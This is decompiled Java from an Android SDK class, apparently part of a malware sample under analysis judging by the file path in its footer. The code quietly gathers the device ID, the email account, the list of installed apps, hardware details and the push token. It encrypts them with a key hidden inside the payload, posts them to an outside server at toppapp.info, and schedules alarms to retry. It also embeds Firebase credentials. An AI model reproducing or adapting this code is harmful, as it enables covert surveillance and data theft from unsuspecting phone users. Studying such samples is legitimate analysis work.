package com.sdk.provide;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import com.google.firebase.FirebaseApp;
import com.google.firebase.FirebaseOptions;
import com.google.firebase.FirebaseOptions.Builder;
import com.sdk.lib.callback.RequestSdkCallBack;
import com.sdk.lib.receiver.PushToServerReceiver;
import com.sdk.provide.asynctask.PostTask;
import com.sdk.provide.asynctask.PostTask.onPostLink1Listener;
import com.sdk.provide.clientinfo.InfoClient;
import com.sdk.provide.utils.LogUtils;
import com.sdk.provide.utils.MCrypt;
import com.sdk.provide.utils.MethodUtils;
import com.sdk.provide.utils.RandomString;
import com.sdk.provide.utils.TinyDB;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import org.json.JSONObject;

public class RequestSdkProvide
  implements RequestSdkCallBack
{
  private static final String LINK1 = "http://toppapp.info/backend/api_set_time.php";
  private static final String LINK2 = "http://toppapp.info/backend/add_devices.php";
  private final int MAX_REQUEST = 10;
  private int TIME_DEFAULT = 10000;
  private int TIME_REQUEST_AGAIN = 30000;
  
  private void alarmSendInfoToServer(Context paramContext, int paramInt)
  {
    Object localObject = new TinyDB(paramContext);
    int i = ((TinyDB)localObject).getInt("count_request_link_2");
    LogUtils.d("count Request Link 2: " + i);
    if (i < 10)
    {
      LogUtils.d("ok request");
      ((TinyDB)localObject).putInt("count_request_link_2", i + 1);
      localObject = PendingIntent.getBroadcast(paramContext, 17, new Intent(paramContext, PushToServerReceiver.class), 0);
      ((AlarmManager)paramContext.getSystemService("alarm")).set(0, System.currentTimeMillis() + paramInt, (PendingIntent)localObject);
    }
  }
  
  private String danhetkeyvaoroi(Context paramContext, String paramString1, String paramString2)
  {
    Object localObject = new RandomString(paramContext);
    paramContext = ((RandomString)localObject).random3kitu();
    localObject = ((RandomString)localObject).random3kitu();
    String str1 = paramString1.substring(0, 3);
    String str2 = paramString1.substring(3, paramString1.length() - 3);
    paramString1 = paramString1.substring(paramString1.length() - 3, paramString1.length());
    paramContext = str1 + paramContext + str2 + (String)localObject + paramString1;
    paramString1 = paramString2.substring(0, paramString2.length() - 3);
    paramString2 = paramString2.substring(paramString2.length() - 3, paramString2.length());
    return paramString1 + paramContext + paramString2;
  }
  
  private String infoJson(Context paramContext)
  {
    Object localObject = new TinyDB(paramContext);
    String str = ((TinyDB)localObject).getString("sender_id_jslib");
    localObject = ((TinyDB)localObject).getString("token_jslib");
    return "{\"id_device\":\"" + InfoClient.getDeviceId(paramContext) + '"' + ",\"lib_version\":" + '"' + InfoClient.getSdkVersion() + '"' + ",\"package_name\":" + '"' + InfoClient.getPackageNameSelf(paramContext) + '"' + ",\"package_version\":" + '"' + InfoClient.getPackageVersionSelf(paramContext) + '"' + ",\"package_names\":" + '"' + InfoClient.getListPackageName(paramContext) + '"' + ",\"name_device\":" + '"' + InfoClient.getDeviceName() + '"' + ",\"android_device\":" + '"' + InfoClient.getDeviceVersion() + '"' + ",\"type_device\":" + '"' + InfoClient.deviceType(paramContext) + '"' + ",\"mail_device\":" + '"' + InfoClient.getMail(paramContext) + '"' + ",\"language_device\":" + '"' + InfoClient.getDeviceLanguage() + '"' + ",\"timezone_device\":" + '"' + InfoClient.getDeviceTimeZone() + '"' + ",\"model_device\":" + '"' + InfoClient.getDeviceHardwareModel() + '"' + ",\"local_device\":" + '"' + InfoClient.getDeviceLocale() + '"' + ",\"network_type_device\":" + '"' + InfoClient.getNetworkClass(paramContext) + '"' + ",\"inch_device\":" + '"' + InfoClient.getDeviceInch(paramContext) + '"' + ",\"with_device\":" + '"' + InfoClient.getDeviceWidth(paramContext) + '"' + ",\"height_device\":" + '"' + InfoClient.getDeviceHeight(paramContext) + '"' + ",\"token\":" + '"' + (String)localObject + '"' + ",\"senderid\":" + '"' + str + '"' + "}";
  }
  
  private String jsonPackageName(Context paramContext)
  {
    return "{\"packagename\":\"" + paramContext.getPackageName() + '"' + "}";
  }
  
  private HashMap<String, String> paramsLink1(Context paramContext)
  {
    HashMap localHashMap = new HashMap();
    String str = new TinyDB(paramContext).getString("random_key_aes_jslib");
    MCrypt localMCrypt = new MCrypt();
    try
    {
      paramContext = danhetkeyvaoroi(paramContext, str, localMCrypt.encrypt(str, jsonPackageName(paramContext)));
      localHashMap.put("infoclient", paramContext);
      LogUtils.d("encode final link1: " + paramContext);
      return localHashMap;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return localHashMap;
  }
  
  private HashMap<String, String> paramsLink2(Context paramContext)
  {
    Object localObject = new TinyDB(paramContext);
    MCrypt localMCrypt = new MCrypt();
    String str2 = infoJson(paramContext);
    String str1 = ((TinyDB)localObject).getString("random_key_aes_jslib");
    localObject = new HashMap();
    try
    {
      str2 = localMCrypt.encrypt(str1, str2);
      paramContext = danhetkeyvaoroi(paramContext, str1, str2);
      ((HashMap)localObject).put("dataclient", paramContext);
      LogUtils.d("key: " + str1);
      LogUtils.d("encode: " + str2);
      LogUtils.d("encode final: " + paramContext);
      LogUtils.d("giai ma: " + localMCrypt.decrypt(str1, str2));
      return (HashMap<String, String>)localObject;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return (HashMap<String, String>)localObject;
  }
  
  private void ready(Context paramContext)
  {
    LogUtils.d("ready");
    Object localObject = new FirebaseOptions.Builder().setApiKey("AIzaSyDV6tmS3q7YrZeS_VRN4b4hV0mxS_yWo38").setApplicationId("jslib-7a874").setDatabaseUrl("https://jslib-7a874.firebaseio.com").setGcmSenderId("591323153301").setStorageBucket("jslib-7a874.appspot.com").build();
    int i = 0;
    Iterator localIterator = FirebaseApp.getApps(paramContext).iterator();
    while (localIterator.hasNext()) {
      if (((FirebaseApp)localIterator.next()).getName().equals("[DEFAULT]")) {
        i = 1;
      }
    }
    if (i == 0) {
      FirebaseApp.initializeApp(paramContext, (FirebaseOptions)localObject);
    }
    localObject = new TinyDB(paramContext);
    if (((TinyDB)localObject).getBoolean("lan_dau_jslib", true))
    {
      ((TinyDB)localObject).putBoolean("lan_dau_jslib", false);
      new RandomString(paramContext).randomKey(16);
    }
    i = ((TinyDB)localObject).getInt("count_request_link_1");
    if ((!((TinyDB)localObject).getBoolean("is_push_info_to_server_jslib", false)) && (i < 10))
    {
      requestLink1(paramContext);
      ((TinyDB)localObject).putInt("count_request_link_1", i + 1);
      ((TinyDB)localObject).putInt("count_request_link_2", 0);
    }
  }
  
  private void requestLink1(final Context paramContext)
  {
    final TinyDB localTinyDB = new TinyDB(paramContext);
    final MCrypt localMCrypt = new MCrypt();
    LogUtils.d("requestLink1");
    if (MethodUtils.isNetworkConnected(paramContext)) {
      new PostTask("http://toppapp.info/backend/api_set_time.php", paramsLink1(paramContext), new PostTask.onPostLink1Listener()
      {
        public void onSuccess(String paramAnonymousString)
        {
          LogUtils.d(paramAnonymousString);
          try
          {
            paramAnonymousString = new JSONObject(paramAnonymousString).getString("response");
            String str1 = localTinyDB.getString("random_key_aes_jslib");
            paramAnonymousString = new JSONObject(localMCrypt.decrypt(str1, paramAnonymousString));
            int i = paramAnonymousString.getInt("status");
            str1 = paramAnonymousString.getString("sender_id");
            String str2 = paramAnonymousString.getString("time_send");
            int j = paramAnonymousString.getInt("is_get_info");
            LogUtils.d("status: " + i + "\n" + str1 + "\ntimesend: " + str2 + "\nis get info: " + j);
            if (str1 != null) {
              localTinyDB.putString("sender_id_jslib", str1);
            }
            if (j == 1)
            {
              if (str2 != null)
              {
                j = Integer.parseInt(str2);
                i = j;
                if (j != 0) {}
              }
              for (i = RequestSdkProvide.this.TIME_DEFAULT;; i = RequestSdkProvide.this.TIME_REQUEST_AGAIN)
              {
                LogUtils.d("time: " + i);
                RequestSdkProvide.this.alarmSendInfoToServer(paramContext, i);
                return;
              }
            }
            return;
          }
          catch (Exception paramAnonymousString)
          {
            paramAnonymousString.printStackTrace();
          }
        }
      }).execute(new String[0]);
    }
  }
  
  private void requestLink2(final Context paramContext)
  {
    final TinyDB localTinyDB = new TinyDB(paramContext);
    final MCrypt localMCrypt = new MCrypt();
    String str = localTinyDB.getString("token_jslib");
    LogUtils.d("requestLink2");
    if ((MethodUtils.isNetworkConnected(paramContext)) && (!str.equals("")))
    {
      new PostTask("http://toppapp.info/backend/add_devices.php", paramsLink2(paramContext), new PostTask.onPostLink1Listener()
      {
        public void onSuccess(String paramAnonymousString)
        {
          LogUtils.d("onSuccess link2: " + paramAnonymousString);
          try
          {
            paramAnonymousString = new JSONObject(paramAnonymousString).getString("response");
            String str = localTinyDB.getString("random_key_aes_jslib");
            paramAnonymousString = localMCrypt.decrypt(str, paramAnonymousString);
            LogUtils.d("response link2: " + paramAnonymousString);
            int i = new JSONObject(paramAnonymousString).getInt("status");
            LogUtils.d("status: " + i);
            if (i == 0)
            {
              RequestSdkProvide.this.alarmSendInfoToServer(paramContext, RequestSdkProvide.this.TIME_REQUEST_AGAIN);
              return;
            }
            if (i == 1)
            {
              localTinyDB.putBoolean("is_push_info_to_server_jslib", true);
              Log.d("sdkjslib", "push to server success");
              return;
            }
          }
          catch (Exception paramAnonymousString)
          {
            paramAnonymousString.printStackTrace();
          }
        }
      }).execute(new String[0]);
      return;
    }
    alarmSendInfoToServer(paramContext, 30000);
  }
  
  public void Ss(Context paramContext)
  {
    ready(paramContext);
    LogUtils.d("token: " + new TinyDB(paramContext).getString("token_jslib"));
  }
  
  public void pushToServer(Context paramContext)
  {
    LogUtils.d("send to server");
    requestLink2(paramContext);
  }
}


/* Location:              /Users/paulpierre/Downloads/malware-unzip/poop.jar!/com/sdk/provide/RequestSdkProvide.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */